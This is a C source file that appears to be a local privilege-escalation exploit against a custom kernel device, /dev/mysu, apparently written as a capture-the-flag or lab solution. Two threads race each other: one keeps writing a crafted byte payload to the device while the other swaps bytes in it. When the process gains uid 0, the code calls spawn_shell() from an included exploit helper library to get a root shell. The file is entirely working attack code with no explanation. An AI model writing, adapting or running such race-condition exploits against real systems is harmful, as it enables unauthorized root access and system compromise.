#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include "kpwn.c"

/*
$ cat /dev/mysu | hexdump -C
00000000  e8 03 00 00 75 9f 31 03  e9 03 00 00 67 64 b7 2a  |....u.1.....gd.*|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*/

int root = 0;
char payload[] = {
    0xe8, 0x03, 0x00, 0x00,
    0x6e, 0x63, 0x7b, 0x89,
    0x00, 0x00, 0x00, 0x40, 
};

void *dev_write(){
    int fd;

    while(!root) {
        if (getuid() == 0) {
            root = 1;
            spawn_shell();
        }
        else {
            payload[0] = 0xe8;
            payload[1] = 0x03;

            if((fd = open("/dev/mysu", O_RDWR)) < 0){
                perror("open");
                exit(1);
            }

            if(write(fd, payload, sizeof(payload)) < 0){
                perror("write");
                exit(1);
            }

            close(fd);
        }
    }
}

void *ctx_root(){
    while(!root) {
        if(getuid() == 0) {
            root = 1;
            spawn_shell();
        }
        else {
            payload[0] = 0x00;
            payload[1] = 0x00;
        }
    }
}

int main(int argc, char *argv[]){
    pthread_t w;
    pthread_t r; 

    pthread_create(&w, NULL, dev_write, NULL);
    pthread_create(&r, NULL, ctx_root, NULL);

    pthread_join(w, NULL);
    pthread_join(r, NULL);
}